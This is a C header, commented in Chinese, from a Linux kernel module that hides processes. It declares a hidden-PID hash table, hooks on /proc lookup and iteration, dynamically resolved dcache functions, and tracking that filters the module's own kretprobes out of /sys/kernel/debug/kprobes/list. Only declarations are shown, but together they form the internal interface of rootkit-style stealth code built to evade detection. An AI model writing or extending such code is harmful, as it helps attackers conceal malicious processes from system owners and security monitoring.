/* hide_internal.h — hide_*.c 之间共享的私有声明
 *
 * 这些符号原本是 hide.c 内部 static,拆文件后被多个 .c 用到,所以提
 * 升为模块私有但跨文件可见(不暴露给 entry.c 之外)。需要保持小、稳定,
 * 不在这里加业务接口。
 */
#ifndef _HIDE_INTERNAL_H_
#define _HIDE_INTERNAL_H_

#include <linux/types.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/spinlock.h>

/* ========================================================================
 *   动态符号查找(hide_core.c 提供 init,其他文件直接读全局指针)
 * ======================================================================== */
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef void (*path_get_t)(const struct path *);
typedef void (*path_put_t)(const struct path *);
typedef void (*d_drop_t)(struct dentry *);
typedef void (*d_invalidate_t)(struct dentry *);
typedef struct dentry *(*lookup_one_len_unlocked_t)(const char *,
                                                    struct dentry *, int);
typedef void (*d_rehash_t)(struct dentry *);

extern kern_path_t  my_kern_path;
extern path_get_t   my_path_get;
extern path_put_t   my_path_put;
extern d_drop_t     my_d_drop;
extern d_invalidate_t my_d_invalidate;
extern lookup_one_len_unlocked_t my_lookup_one_len_unlocked;
extern d_rehash_t my_d_rehash;

int  hide_init_path_functions(void);
void nbg_dcache_invalidate(struct dentry *dentry);
struct dentry *nbg_lookup_one_len_unlocked(const char *name,
                                            struct dentry *parent,
                                            int len);
void nbg_dcache_rehash(struct dentry *dentry);

/* ========================================================================
 *   隐藏 pid 表(hide_core.c)
 *
 *   实现:64-bucket 哈希表 + RCU 读端。
 *   读路径(proc_name_is_hidden_pid / tgid_is_hidden)无锁,只 rcu_read_lock
 *   遍历单个 bucket(典型 0-1 项);写路径(add/remove)持 spinlock。
 *   外加 atomic_t hidden_pid_count 给热路径(pid_revalidate kretprobe /
 *   maps 行过滤)零成本短路用:count==0 → 立刻 return false。
 * ======================================================================== */
#include <linux/hashtable.h>
#include <linux/rcupdate.h>
#include <linux/atomic.h>

struct hidden_process {
    pid_t              pid;
    struct dentry      *proc_dentry; /* pinned across hide -> unhide */
    struct hlist_node  hnode;       /* 链入 hidden_pids_ht */
    struct list_head   list;        /* 兼容旧的"批量遍历释放"路径 */
    struct rcu_head    rcu;         /* kfree_rcu 用 */
};

/* hidden_pids 仍保留为一条 list_head,方便 cleanup_all_hidden_processes 等
 * 需要批量遍历的路径(O(n) 但只在卸载时跑)。日常热路径走哈希表。 */
extern struct list_head    hidden_pids;
extern spinlock_t          hidden_pids_lock;
extern atomic_t            hidden_pid_count;

#define HIDDEN_PIDS_HBITS  6        /* 64 buckets */
extern struct hlist_head   hidden_pids_ht[1 << HIDDEN_PIDS_HBITS];

bool proc_name_is_hidden_pid(const char *name, int namlen);
bool tgid_is_hidden(pid_t tgid);

/* 供热路径短路用的 inline 版本:0 hidden pid 时单 atomic_read 即返回。
 * 调用方仍可继续走 proc_name_is_hidden_pid / tgid_is_hidden 处理实际查询。 */
static inline bool hidden_pids_empty(void)
{
    return atomic_read(&hidden_pid_count) == 0;
}


/* kretprobe 地址跟踪: hide_module 用于过滤 /sys/kernel/debug/kprobes/list。 */
void track_hidden_kprobe(struct kretprobe *krp);
void untrack_hidden_kprobe(struct kretprobe *krp);
void track_hidden_kprobe_addr(unsigned long addr);
void untrack_hidden_kprobe_addr(unsigned long addr);
int  hide_kprobe_addr_count(void);
unsigned long hide_kprobe_addr_at(int i);

struct ks_kretprobe_data {
    struct seq_file *m;
    size_t           before;
};

int ks_entry(struct kretprobe_instance *ri, struct pt_regs *regs);

/* hide_file.c:供 hide_core.c 模块卸载路径统一清理 */
void cleanup_all_hooks(void);

/* ========================================================================
 *   /proc lookup/iterate hook(hide_proc.c)
 * ======================================================================== */
int  install_proc_hook(void);
void remove_proc_hook(void);

#endif /* _HIDE_INTERNAL_H_ */
